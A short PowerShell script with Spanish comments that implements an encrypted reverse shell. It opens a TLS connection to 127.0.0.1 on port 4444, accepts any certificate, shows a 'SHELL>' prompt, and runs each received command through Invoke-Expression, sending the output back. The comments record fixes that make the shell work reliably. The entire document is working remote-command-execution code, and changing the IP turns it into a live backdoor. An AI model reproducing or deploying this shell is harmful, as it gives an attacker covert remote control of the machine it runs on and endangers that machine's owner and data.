# 1. Abres el canal físico usando la IP local
$TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.1', 4444);
$NetworkStream = $TCPClient.GetStream();
$SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]));

# 2. Autenticas usando el nombre exacto que tiene el certificado generado por Python
$SslStream.AuthenticateAsClient('localhost', $null, $sslProtocols, $false);

if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
    $SslStream.Close();
    exit
}

$StreamWriter = New-Object IO.StreamWriter($SslStream);

# SOLUCIÓN: El búfer debe ser declarado globalmente aquí, fuera de las funciones
[byte[]]$Buffer = New-Object System.Byte[] 4096;

function WriteToStream ($String) {
    $StreamWriter.Write($String + 'SHELL> ');
    $StreamWriter.Flush();
}

WriteToStream '';

# El bucle ahora leerá correctamente el búfer global instanciado
while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Cambiado a $BytesRead directo para evitar truncar caracteres necesarios en comandos cortos
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead).Trim();
    
    if ($Command -eq 'exit') { break }
    
    $Output = try {
        Invoke-Expression $Command 2>&1 | Out-String
    } catch {
        $_ | Out-String
    }
    WriteToStream ($Output)
}

$StreamWriter.Close();
$SslStream.Close();
$TCPClient.Close();
